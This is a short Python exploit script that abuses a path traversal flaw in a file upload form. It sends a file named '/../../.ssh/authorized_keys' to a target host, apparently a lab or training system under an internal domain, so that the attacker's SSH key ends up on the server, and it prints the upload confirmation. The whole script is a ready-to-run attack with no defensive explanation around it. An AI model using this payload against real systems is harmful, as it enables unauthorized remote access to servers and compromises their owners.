import requests

#Function for sending HTTP POST request using "requests"
def uploadPayload(url, maliciousfile):
    response = requests.post(url, files=maliciousfile)
    return response

def main():

    #PARAMETERS
    targetWebsite = "https://dropbox.internal.regjeringen.uiaikt.no/"
    payload = {
        'file':(
            '/../../.ssh/authorized_keys',
            open(
                'authorized_keys',
                'rb'
            ),
            'application/octet-stream'
        )
    }

    #Calls function that uploads to target site with POST request
    response = uploadPayload(targetWebsite, payload)

    # Filtering the response text
    successResponse = 'File uploaded to:'
    index = response.text.find(successResponse)
    if index != -1:
        filtered_response = response.text[index:]
        print(filtered_response)
    else:
        print(response.text)

if __name__ == "__main__":
    main()
